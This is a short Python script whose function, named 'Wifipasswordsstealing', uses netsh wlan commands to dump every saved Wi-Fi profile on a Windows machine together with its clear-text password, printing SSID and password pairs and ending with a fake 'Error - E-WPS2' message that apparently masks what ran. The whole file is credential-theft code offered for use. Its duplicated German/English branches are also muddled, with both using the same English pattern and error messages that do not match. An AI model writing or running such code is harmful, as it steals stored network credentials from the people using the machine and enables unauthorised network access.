from msilib.schema import File
import re
import subprocess

def Wifipasswordsstealing():
    try:

        cmd_output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

        profile_names = (re.findall(
            "All User Profile     : (.*)\r", cmd_output))

        wifi_list = list()

        if len(profile_names) != 0:
            for name in profile_names:
               
                wifi_profile = dict()
                
                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
                
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                   
                    wifi_profile["ssid"] = name
                   
                    profile_info_pass = subprocess.run(
                        ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                    
                    password = re.search(
                        "Key Content            : (.*)\r", profile_info_pass)
                    
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        
                        wifi_profile["password"] = password[1]
                    
                    wifi_list.append(wifi_profile)

        
        print("Hier die Daten: ")
        for item in wifi_list:
            print(f"SSID: {item['ssid']}, Password: {item['password']}\n")

    except:
        print("It is not a German Language based System")

    try:
        command_output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

        profile_names = (re.findall(
            "All User Profile     : (.*)\r", command_output))

        wifi_list = list()

        if len(profile_names) != 0:
            for name in profile_names:

                wifi_profile = dict()

                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()

                if re.search("Security key           : Absent", profile_info):
                    continue
                else:

                    wifi_profile["ssid"] = name

                    profile_info_pass = subprocess.run(
                        ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()

                    password = re.search(
                        "Key Content            : (.*)\r", profile_info_pass)

                    if password == None:
                        wifi_profile["password"] = None
                    else:

                        wifi_profile["password"] = password[1]

                    wifi_list.append(wifi_profile)

        print("Hier die Daten: ")
        for item in wifi_list:
            print(f"SSID: {item['ssid']}, Password: {item['password']}\n")

    except:
        print("It is not a English Language based System")

    finally:
        print("Error - E-WPS2 ")